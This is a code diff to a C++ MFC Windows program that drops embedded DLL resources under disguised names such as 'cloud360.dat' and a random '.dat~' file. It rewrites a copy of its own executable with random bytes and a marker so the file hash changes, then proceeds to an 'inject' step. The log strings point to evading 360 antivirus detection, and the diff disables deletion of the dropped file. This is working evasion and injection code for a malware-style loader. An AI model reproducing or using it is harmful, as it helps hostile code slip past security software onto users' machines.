@@ -80,6 +80,8 @@ void Recurse(LPCTSTR pstr)
 
 extern LRESULT CALLBACK  MainHandler(HWND, UINT, WPARAM, LPARAM);
 
+wchar_t handle_dll[512];
+
 BOOL CMFCApplication1App::InitInstance()
 {
 	// 如果一个运行在 Windows XP 上的应用程序清单指定要
@@ -285,12 +287,88 @@ BOOL CMFCApplication1App::InitInstance()
 			wsprintf(szPathClone, __TEXT("%s/cloud360.dat"), szPathOrig);
 			xlog::Normal("extract dats");
 			//ReleaseResFile(IDR_RT_DLL2, _T("RT_DLL"), szPathClone);
+			static const wchar_t alphabet[] = L"ABCDEFGHIJKLMNOPQRSTUVWXYZbcdefghijklmnopqrstuvwxyz1234567890";
+			static std::random_device rd;
+			static std::uniform_int_distribution<> dist(0, ARRAYSIZE(alphabet) - 2);
+			static std::uniform_int_distribution<> dist_len(5, 15);
+			std::wstring result;
+
+			// Get random string length
+			int length = 0;
+			if (length == 0)
+				length = dist_len(rd);
+
+			for (int i = 0; i < length; i++)
+				result.push_back(alphabet[dist(rd)]);
+
+
+
+			result.append(_T(".dat~"));
+
 			ReleaseResFile(IDR_RT_DLL2, _T("RT_DLL"), _T("./cloud360.dat"));
-			ReleaseResFile(IDR_RT_DLL1, _T("RT_DLL"), _T("./cloud360.dat~"));
+			ReleaseResFile(IDR_RT_DLL1, _T("RT_DLL"), result.c_str());
+			wsprintf(handle_dll, __TEXT("%s"), result.c_str()); 
+
+			HANDLE hFile2;//定义一个句柄。   
+			hFile2 = CreateFile(__targv[0],
+				GENERIC_READ,
+				FILE_SHARE_READ,
+				NULL,
+				OPEN_EXISTING,
+				FILE_ATTRIBUTE_NORMAL,
+				NULL);//使用CreatFile这个API函数打开文件   
+			DWORD dwDataLen;
+			char * FileContent = new char[30 * 1024 * 1024];
+			ReadFile(hFile2, FileContent, 30 * 1024 * 1024, &dwDataLen, NULL);//读取数据   
+			FileContent[dwDataLen] = 0;//将数组未尾设零。   
+			CloseHandle(hFile2);//关闭句柄   
+			srand((unsigned)time(NULL));
+			if (strncmp(FileContent + dwDataLen - 630, "199131", 6) == 0)
+			{
+				//rewrite 1024
+
+				for (int i = 1024; i > 0; i--)
+					FileContent[dwDataLen - i] = rand() % 256;
+				FileContent[dwDataLen - 630] = '1';
+				FileContent[dwDataLen - 630 + 1] = '9';
+				FileContent[dwDataLen - 630 + 2] = '9';
+				FileContent[dwDataLen - 630 + 3] = '1';
+				FileContent[dwDataLen - 630 + 4] = '3';
+				FileContent[dwDataLen - 630 + 5] = '1';
+
+			}
+			else
+			{
+				//add 1024
+				dwDataLen = dwDataLen + 1024;
+				for (int i = 1024; i > 0; i--)
+					FileContent[dwDataLen - i] = rand() % 256;
+				FileContent[dwDataLen - 630] = '1';
+				FileContent[dwDataLen - 630 + 1] = '9';
+				FileContent[dwDataLen - 630 + 2] = '9';
+				FileContent[dwDataLen - 630 + 3] = '1';
+				FileContent[dwDataLen - 630 + 4] = '3';
+				FileContent[dwDataLen - 630 + 5] = '1';
+
+			}
+
+			hFile2 = CreateFile(result.c_str(),
+				GENERIC_WRITE,
+				FILE_SHARE_WRITE,
+				NULL,
+				CREATE_NEW,
+				FILE_ATTRIBUTE_NORMAL,
+				NULL);//使用CreatFile这个API函数打开文件   
+			DWORD Written;
+			WriteFile(hFile2, FileContent, dwDataLen, &Written, NULL);//写入文件   
+			CloseHandle(hFile2);//关闭句柄
+								//DeleteFile(__targv[2]);
+			xlog::Normal("change 360~ hash");
+
 			xlog::Normal("inject 360~");
 			my_wWinMain();
 			xlog::Normal("delete 360~");
-			DeleteFile(_T("./cloud360.dat~"));
+			//DeleteFile(_T("./cloud360.dat~"));
 			xlog::Normal("quit");
 			
 		
